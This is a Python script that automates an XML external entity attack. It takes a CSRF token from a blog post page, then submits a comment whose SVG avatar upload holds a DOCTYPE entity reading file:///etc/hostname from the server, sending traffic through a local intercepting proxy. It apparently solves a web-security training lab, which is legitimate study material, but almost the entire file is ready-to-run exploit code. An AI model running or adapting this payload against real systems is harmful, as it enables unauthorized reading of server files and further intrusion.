import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import random, string
from requests_toolbelt import MultipartEncoder

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

FAIL = -1

proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'}

def get_csrf_token(url, session):
    response = session.get(
        url,
        verify=False,
        proxies=proxies)
    html = BeautifulSoup(
        response.text,
        'html.parser')
    csrf = html.find(
        "input", {'name': 'csrf'})['value']
    return csrf

def is_xxe_attack_successful(url, session):
    post_url = url + "/post?postId=1"
    csrf_token = get_csrf_token(post_url, session)
    comment_url = url + "/post/comment"
    params = {
        "csrf": csrf_token,
        "postId": "1",
        "comment": "test",
        "name": "test",
        "avatar": (
            'test.svg',
            '<?xml version="1.0" standalone="yes"?>'
            '<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>'
            '<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" '
            'xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">'
            '<text font-size="16" x="0" y="16">&xxe;</text></svg>',
            'image/svg+xml'
        ),
        "email": "test@test.ca",
        "website": "http://www.test.ca"
    }
    boundary = (
        '------WebKitFormBoundary' + 
        ''.join(random.sample(
            string.ascii_letters + string.digits, 16)))
    multi_part = MultipartEncoder(
        fields=params,
        boundary=boundary
    )
    headers = {
        'Content-Type': multi_part.content_type}
    response = session.post(
        comment_url,
        data=multi_part, 
        headers=headers,
        verify=False, proxies=proxies)
    return response.status_code == 200

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        session = requests.Session()
        print("[+] Starting XXE attack...")
        if not is_xxe_attack_successful(url, session):
            print("[-] XXE attack was not successful.")
            sys.exit(FAIL)
        print("[+] XXE Attack was successful.")
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(FAIL)
    except Exception as exception:
        print("[-] An exception occured %s" % exception)
        print("[-] The XXE attack was not successful.")
        sys.exit(FAIL) 